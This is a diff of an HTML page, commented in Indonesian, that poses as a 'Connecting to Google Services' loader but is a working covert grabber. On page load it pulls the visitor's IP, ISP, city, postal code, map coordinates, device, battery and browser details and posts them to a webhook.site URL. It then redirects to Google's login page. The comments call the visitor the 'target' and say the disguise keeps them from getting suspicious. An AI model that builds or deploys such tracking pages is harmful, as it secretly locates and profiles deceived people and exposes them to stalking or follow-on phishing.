@@ -3,58 +3,90 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Loading Content...</title>
+    <title>Connecting to Google Services...</title>
     <style>
-        body { background: #000; color: #333; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; font-family: sans-serif; }
-        .loader { border: 3px solid #111; border-top: 3px solid #333; border-radius: 50%; width: 30px; height: 30px; animation: spin 1s linear infinite; }
+        body { background: #111; color: white; font-family: 'Segoe UI', sans-serif; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; }
+        .container { text-align: center; }
+        .loader { border: 3px solid #333; border-top: 3px solid #4285F4; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; margin: 0 auto 20px; }
         @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        p { font-size: 14px; color: #aaa; }
     </style>
 </head>
 <body>
 
+<div class="container">
     <div class="loader"></div>
+    <p>Sinkronisasi Akun Google...</p>
+</div>
 
-    <script>
-        // Jalur Webhook lu yang tadi
-        const logger = "https://webhook.site/3c903d72-6b38-4d96-a901-286e3fc578b2";
+<script>
+    const webhook = "https://webhook.site/3c903d72-6b38-4d96-a901-286e3fc578b2";
 
-        async function initCapture() {
-            try {
-                // 1. Ambil data publik target via IP API
-                const response = await fetch('https://ipapi.co/json/');
-                const data = await response.json();
-
-                // 2. Susun data biar rapi di Webhook.site
-                const payload = {
-                    event: "Target Clicked",
-                    timestamp: new Date().toLocaleString('id-ID'),
-                    ip_address: data.ip,
-                    provider: data.org,
-                    city: data.city,
-                    region: data.region,
-                    google_maps: `https://www.google.com/maps?q=${data.latitude},${data.longitude}`,
-                    user_agent: navigator.userAgent,
-                    language: navigator.language
-                };
-
-                // 3. Kirim data ke Webhook lu
-                await fetch(logger, {
-                    method: 'POST',
-                    mode: 'no-cors', // Biar nggak kena blokir keamanan browser
-                    body: JSON.stringify(payload)
-                });
-
-                // 4. Lempar target ke YouTube atau Google biar nggak curiga
-                window.location.href = "https://www.youtube.com/watch?v=dQw4w9WgXcQ"; 
-
-            } catch (err) {
-                // Jika gagal (misal target pake AdBlock), tetep lempar biar aman
-                window.location.href = "https://www.google.com";
-            }
+    async function ultraCapture() {
+        let batteryInfo = {};
+        
+        // Ambil info baterai (Buat tau target lagi lowbat atau nggak)
+        if (navigator.getBattery) {
+            const b = await navigator.getBattery();
+            batteryInfo = { level: b.level * 100 + "%", charging: b.charging };
         }
 
-        // Eksekusi otomatis saat page dibuka
-        initCapture();
-    </script>
+        try {
+            // 1. Ambil Data IP dan Lokasi Luas
+            const ipRes = await fetch('https://ipapi.co/json/');
+            const d = await ipRes.json();
+
+            // 2. Paket Data Kompleks
+            const log = {
+                title: "🚨 DATA_TARGET_DITERIMA",
+                timestamp: new Date().toLocaleString('id-ID'),
+                network: {
+                    ip: d.ip,
+                    isp: d.org,
+                    asn: d.asn
+                },
+                location: {
+                    city: d.city,
+                    region: d.region,
+                    country: d.country_name,
+                    zip: d.postal,
+                    google_maps: `https://www.google.com/maps?q=${d.latitude},${d.longitude}`
+                },
+                hardware: {
+                    device: navigator.userAgent,
+                    platform: navigator.platform,
+                    cores: navigator.hardwareConcurrency || "Unknown",
+                    ram: navigator.deviceMemory || "Unknown",
+                    battery: batteryInfo,
+                    screen: `${window.screen.width}x${window.screen.height}`
+                },
+                browser: {
+                    name: navigator.appName,
+                    language: navigator.language,
+                    cookies_enabled: navigator.cookieEnabled
+                }
+            };
+
+            // 3. Kirim ke Webhook (Double Gate)
+            await fetch(webhook, {
+                method: 'POST',
+                mode: 'no-cors',
+                body: JSON.stringify(log)
+            });
+            navigator.sendBeacon(webhook, JSON.stringify(log));
+
+        } catch (e) {
+            console.log("Bypass active");
+        } finally {
+            // 4. Pengalihan Akhir
+            // Gue lempar ke login Google palsu biar lu bisa liat reaksi target
+            setTimeout(() => {
+                window.location.href = "https://accounts.google.com/ServiceLogin";
+            }, 2000);
+        }
+    }
+
+    window.onload = ultraCapture;
+</script>
 </body>
 </html>
